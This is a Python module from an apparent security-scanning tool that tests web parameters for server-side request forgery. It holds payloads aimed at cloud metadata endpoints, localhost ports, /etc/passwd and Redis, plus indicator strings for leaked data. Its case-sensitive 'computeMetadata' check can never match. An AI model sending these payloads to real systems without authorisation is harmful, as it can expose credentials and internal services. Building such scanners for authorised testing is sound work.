"""
OWASP A10 — SSRF (Server-Side Request Forgery) Testing Module.
"""

from __future__ import annotations

from typing import Any, Dict, List, Optional

import aiohttp

from sapt.core.logger import get_logger, log_finding
from sapt.models.models import Finding, Evidence, VulnerabilityType, SeverityLevel


SSRF_PAYLOADS = [
    "http://127.0.0.1",
    "http://localhost",
    "http://0.0.0.0",
    "http://[::1]",
    "http://169.254.169.254/latest/meta-data/",     # AWS metadata
    "http://metadata.google.internal/",              # GCP metadata
    "http://169.254.169.254/metadata/v1/",           # Azure metadata
    "http://127.0.0.1:22",
    "http://127.0.0.1:3306",
    "file:///etc/passwd",
    "dict://127.0.0.1:6379/info",                    # Redis
    "gopher://127.0.0.1:25",
]

SSRF_PARAM_NAMES = [
    "url", "uri", "path", "dest", "redirect", "redirect_uri",
    "return", "return_to", "next", "target", "rurl", "domain",
    "feed", "host", "site", "html", "data", "reference", "ref",
    "callback", "webhook", "proxy", "link", "src", "source",
    "imageurl", "image_url", "img", "page",
]

SSRF_SUCCESS_INDICATORS = [
    "root:", "uid=", "gid=",
    "ami-id", "instance-id", "local-ipv4",
    "computeMetadata",
    "metadata/v1",
]


async def test_ssrf(
    target_urls: List[str],
    session: Optional[aiohttp.ClientSession] = None,
) -> List[Finding]:
    """Test for SSRF vulnerabilities."""
    logger = get_logger()
    findings: List[Finding] = []
    close_session = False

    if session is None:
        session = aiohttp.ClientSession()
        close_session = True

    try:
        for url in target_urls:
            for param in SSRF_PARAM_NAMES:
                for payload in SSRF_PAYLOADS[:5]:
                    separator = "&" if "?" in url else "?"
                    test_url = f"{url}{separator}{param}={payload}"

                    try:
                        async with session.get(
                            test_url,
                            timeout=aiohttp.ClientTimeout(total=8),
                            allow_redirects=False,
                        ) as resp:
                            body = await resp.text()
                            body_lower = body.lower()

                            for indicator in SSRF_SUCCESS_INDICATORS:
                                if indicator in body_lower:
                                    finding = Finding(
                                        id=f"ssrf_{len(findings)+1:03d}",
                                        target_url=test_url,
                                        vuln_type=VulnerabilityType.SSRF,
                                        severity=SeverityLevel.CRITICAL,
                                        title=f"SSRF via {param} parameter",
                                        description=(
                                            f"Server-side request forgery detected. "
                                            f"Payload '{payload}' in '{param}' parameter "
                                            f"returned internal data indicator: '{indicator}'"
                                        ),
                                        owasp_category="A10",
                                        evidence=[Evidence(
                                            type="http_request",
                                            data=f"GET {test_url}\n\nIndicator: {indicator}",
                                        )],
                                        tool_source="sapt_ssrf",
                                    )
                                    findings.append(finding)
                                    log_finding(finding.title, "critical")
                                    break

                    except Exception:
                        continue

    finally:
        if close_session:
            await session.close()

    logger.info(f"SSRF testing: {len(findings)} findings")
    return findings
